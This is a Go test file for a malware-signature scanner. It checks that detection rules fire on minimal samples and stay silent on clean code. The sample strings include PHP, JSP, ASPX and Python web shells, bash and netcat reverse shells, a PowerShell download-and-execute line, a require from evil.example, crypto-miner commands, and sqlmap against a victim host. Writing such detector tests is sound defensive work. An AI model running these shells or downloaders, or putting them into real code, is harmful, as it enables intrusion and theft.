package security

import (
	"context"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestSignaturePositives runs the built-in signature engine against
// one minimum-viable payload per signature ID. Each positive sample
// is the smallest snippet that should plausibly fire that signature.
func TestSignaturePositives(t *testing.T) {
	cases := []struct {
		ruleID  string
		path    string
		content string
	}{
		{"YR2_php_eval_shell", "x.php", "<?php eval($_GET['c']); ?>"},
		{"YR2_php_system_passthru", "x.php", "<?php system($_POST['c']); ?>"},
		{"YR2_jsp_runtime_exec", "x.jsp", "Runtime.getRuntime().exec(request.getParameter(\"c\"))"},
		{"YR2_aspx_eval", "x.aspx", "<%@ Page Language=\"C#\" %>\nEval(Request[\"c\"])"},
		{"YR2_python_request_exec", "x.py", "from flask import request\nexec(request.args[\"c\"])"},
		{"YR1_python_reverse_shell", "x.py", "import socket\nimport os\nos.dup2(s.fileno(),0)\nos.execve('/bin/sh', ['sh'], {})"},
		{"YR1_bash_reverse_shell", "x.sh", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
		{"YR1_nc_reverse_shell", "x.sh", "nc -e /bin/sh 10.0.0.1 4444"},
		{"YR1_powershell_downloader", "x.ps1", "IEX (New-Object Net.WebClient).DownloadString('http://x')"},
		{"YR1_node_eval_fetch", "x.js", "const m = require('https://evil.example/x.js'); eval(m)"},
		{"YR3_stratum_protocol", "x.json", "stratum+tcp://pool.example:3333"},
		{"YR3_xmrig", "x.sh", "xmrig --donate-level 1 -o pool.example:3333"},
		{"YR3_browser_miner", "miner.js", "loadScript('https://coinhive.com/lib/miner.js')"},
		{"YR4_mimikatz", "doc.md", "the script invokes mimikatz to dump credentials"},
		{"YR4_meterpreter", "doc.md", "uses meterpreter for post-ex"},
		{"YR4_cobalt_strike", "doc.md", "cobalt strike beacon for C2"},
		{"YR4_sqlmap", "x.sh", "sqlmap -u https://victim.example --data id=1"},
	}
	check := NewSignatureCheck()
	for _, c := range cases {
		t.Run(c.ruleID, func(t *testing.T) {
			findings := check.Run(context.Background(), nil, []FileEntry{
				{Path: c.path, Content: c.content + "\n"},
			})
			require.NotEmpty(t, findings)
			var hit bool
			for _, f := range findings {
				if f.RuleID == c.ruleID {
					hit = true
					assert.Equal(t, CategoryYARAMatch, f.Category)
					assert.NotEmpty(t, f.Remediation)
				}
			}
			assert.True(t, hit, "expected %s, got %v", c.ruleID, ruleIDs(findings))
		})
	}
}

func TestSignatureNegativesCleanCode(t *testing.T) {
	clean := []FileEntry{
		{Path: "main.py", Content: "import json\nprint(json.dumps({'ok': True}))\n"},
		{Path: "SKILL.md", Content: "# clean\nformats timestamps\n"},
	}
	findings := NewSignatureCheck().Run(context.Background(), nil, clean)
	assert.Empty(t, findings)
}

func TestSignatureLineAttribution(t *testing.T) {
	content := "first line\n<?php\neval($_GET['c']);\n"
	findings := NewSignatureCheck().Run(context.Background(), nil, []FileEntry{
		{Path: "x.php", Content: content},
	})
	require.NotEmpty(t, findings)
	for _, f := range findings {
		if f.RuleID == "YR2_php_eval_shell" {
			assert.Equal(t, 2, f.Line, "should attribute to the first matching pattern's line")
		}
	}
}

func TestSignatureAllOfSemantics(t *testing.T) {
	// `<?php` alone is not a webshell.
	clean := []FileEntry{
		{Path: "x.php", Content: "<?php\necho 'hi';\n"},
	}
	findings := NewSignatureCheck().Run(context.Background(), nil, clean)
	assert.Empty(t, findings, "a PHP file without eval/system over request must not fire YR2")
}
